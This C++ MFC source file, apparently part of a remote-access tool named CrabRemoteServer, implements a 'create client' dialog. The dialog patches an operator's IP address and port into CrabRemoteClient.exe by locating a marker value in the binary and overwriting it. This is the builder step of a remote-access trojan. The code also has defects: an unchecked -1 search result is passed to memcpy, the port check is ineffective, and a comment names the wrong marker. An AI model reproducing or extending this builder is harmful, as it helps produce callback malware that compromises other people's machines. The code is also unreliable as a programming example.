// CreateClientDlg.cpp: 实现文件
//

#include "pch.h"
#include "CrabRemoteServer.h"
#include "CreateClientDlg.h"
#include "afxdialogex.h"


// CCreateClientDlg 对话框
struct _SERVER_CONNECT_INFO
{
	DWORD CheckFlag;   //搜索
	char  Ip[20];
	USHORT   Port;
}__ConnectInfo = { 0x87654321,"",0 };
IMPLEMENT_DYNAMIC(CCreateClientDlg, CDialogEx)

CCreateClientDlg::CCreateClientDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_CREATE_CLIENT_DIALOG, pParent)
	, m_IpEdit(_T("输入一个IP"))
	, m_PortEdit(_T("输入一个端口号"))
{

}

CCreateClientDlg::~CCreateClientDlg()
{
}

void CCreateClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//  DDX_Control(pDX, IDC_IP_EDIT, m_IpEdit);
	DDX_Text(pDX, IDC_IP_EDIT, m_IpEdit);
	DDX_Text(pDX, IDC_PORT_EDIT, m_PortEdit);
}


BEGIN_MESSAGE_MAP(CCreateClientDlg, CDialogEx)
	//ON_BN_CLICKED(IDC_BUTTON1, &CCreateClientDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_OK_BUTTON, &CCreateClientDlg::OnBnClickedOkButton)
END_MESSAGE_MAP()


// CCreateClientDlg 消息处理程序


BOOL CCreateClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


//void CCreateClientDlg::OnBnClickedButton1()
//{
//	// TODO: 在此添加控件通知处理程序代码
//}


void CCreateClientDlg::OnBnClickedOkButton()
{
	// TODO: 在此添加控件通知处理程序代码
	CFile FileObject;

	UpdateData(TRUE);   //输入在控件上的数据更新到控件变量上
	USHORT  Port = atoi(m_PortEdit);
	strcpy(__ConnectInfo.Ip, m_IpEdit);
	//127 
	if (Port < 0 || Port>65536)
	{
		__ConnectInfo.Port = 8888;
	}
	else
	{
		__ConnectInfo.Port = Port;   //端口
	}


	TCHAR v1[MAX_PATH];
	ZeroMemory(v1, MAX_PATH);

	LONGLONG BufferLength = 0;
	BYTE* BufferData = NULL;
	CString  v3;
	CString  ClientFullPath;
	try
	{

		//ClientProject.exe 与 ServerProject.exe 在同一个目录下
		//此处得到未处理前的文件名
		GetModuleFileName(NULL, v1, MAX_PATH);     //得到文件名  完整路径    Z:\ServerProject\\Debug\\ServerProject.exe
		v3 = v1;
		int Pos = v3.ReverseFind(_T('\\'));   //从右到左查询第一次出现的\\  C:...\\\\Debug\\

		v3 = v3.Left(Pos);   // Z:\ServerProject\\Debug\\


		ClientFullPath = v3 + _T("\\CrabRemoteClient.exe");   // Z:\ServerProject\\Debug\\ClientProject.exe

																	//打开文件
		FileObject.Open(ClientFullPath, CFile::modeRead | CFile::typeBinary);

		BufferLength = FileObject.GetLength();
		BufferData = new BYTE[BufferLength];
		ZeroMemory(BufferData, BufferLength);
		//读取文件内容

		FileObject.Read(BufferData, BufferLength);
		FileObject.Close();
		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置


		//全局变量是在PE文件的Data节中
		int Offset = MemoryFind((char*)BufferData, (char*)&__ConnectInfo.CheckFlag,
			BufferLength, sizeof(DWORD));
		memcpy(BufferData + Offset, &__ConnectInfo, sizeof(__ConnectInfo));   //写操作
		//保存到文件
		FileObject.Open(ClientFullPath, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		FileObject.Write(BufferData, BufferLength);
		FileObject.Close();
		delete[] BufferData;
		MessageBox("生成成功");

	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误");
	}
	catch (CException* e)
	{
		MessageBox("未知错误");
	}



	CDialogEx::OnOK();
}

int CCreateClientDlg::MemoryFind(const char* BufferData, const char* KeyValue, int BufferLength, int KeyLength)
{
	int i, j;
	if (KeyLength == 0 || BufferLength == 0)
	{
		return -1;
	}
	//BF 匹配算法
	for (i = 0; i < BufferLength; i++)
	{
		for (j = 0; j < KeyLength; j++)
		{
			if (BufferData[i + j] != KeyValue[j])
			{
				break;
			}
		}
		//0x12345678   78   56  34  12
		if (j == KeyLength)
		{
			return i;
		}
	}
	// BMK Hello
	return -1;
}
